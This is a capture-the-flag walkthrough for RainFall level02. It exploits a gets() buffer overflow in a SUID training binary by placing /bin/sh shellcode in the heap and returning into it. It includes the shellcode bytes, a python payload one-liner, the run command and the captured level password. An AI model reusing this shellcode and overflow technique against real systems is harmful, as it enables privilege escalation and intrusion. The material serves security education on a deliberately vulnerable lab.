# RainFall Level02 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level2@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level2@RainFall:~$ ls -l
-rwsr-s---+ 1 level3 users 7536 Aug 30  2022 level2
```

This binary is SUID-owned by `level3`, and executing it runs a vulnerable input handler.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char* p()
{
    char input[80];

    fflush(stdout);
    gets(input);

    void* return_address = __builtin_return_address(0);
    if (((unsigned long)return_address & 0xB0000000) != 0xB0000000) 
    {
        puts(input);
        return strdup(input);
    }

    printf("(%p)\n", return_address);
    exit(1);
}

int main(int argc, char** argv, char** envp) 
{
    return (int)p();
}
```

* `gets()` makes the binary vulnerable to a buffer overflow.
* However, it performs a check on the return address to block redirection to the stack.
* If the return address does not reside in the `0xB0000000` range (typically reserved for the stack), execution continues.
* Therefore, our shellcode must reside **outside the stack**, and the return address must point somewhere like the **heap**, such as where `strdup()` places the copied input.

---

## Step 3: Finding the Heap Address with ltrace

Using `ltrace`, we confirm where `strdup()` places the input in the heap:

```bash
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, ...) = ...
fflush(0xb7fd1a20) = 0
gets(0xbffff70c) = 0xbffff70c
puts("") = 1
strdup("") = 0x0804a008
```

The address `0x0804a008` will be used as the return address in our payload.

---

## Step 4: Calculating Offset with GDB

We disassemble `p()` and add a breakpoint after the `gets()` call:

```gdb
(gdb) disas p
...
0x080484ed <+25>: call 0x80483c0 <gets@plt>
...
0x08048500 <+44>: cmp $0xb0000000,%eax
...
(gdb) b *p+44
```

Run the binary and enter a known pattern:

```gdb
(gdb) run
Starting program: /home/user/level2/level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Check the stack:

```gdb
(gdb) x/100x $esp
...
0xbffff6d0:     0x080482b5      0x00000000      0x00c30000      0x61616161
0xbffff6e0:     0x61616161      0x61616161      0x61616161      0x61616161
...
```

Get the frame info:

```gdb
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048500 in p; saved eip 0x08006161
 ebp at 0xbffff728, eip at 0xbffff72c
```

Calculate offset:

```gdb
(gdb) p 0xbffff72c - 0xbffff6dc
$1 = 80
```

**Offset to EIP is 80 bytes.**

---

## Step 5: Constructing the Exploit

We inject shellcode followed by padding and then the heap address:

```bash
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

Construct the payload:

```bash
python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08")' > /tmp/level2.exploit
```

Execute:

```bash
(cat /tmp/level2.exploit; cat) | ./level2
```

This triggers execution of our shellcode from the heap.

---

## Step 6: Retrieving the Flag

```bash
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## Step 7: Move to Level03

```bash
level2@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
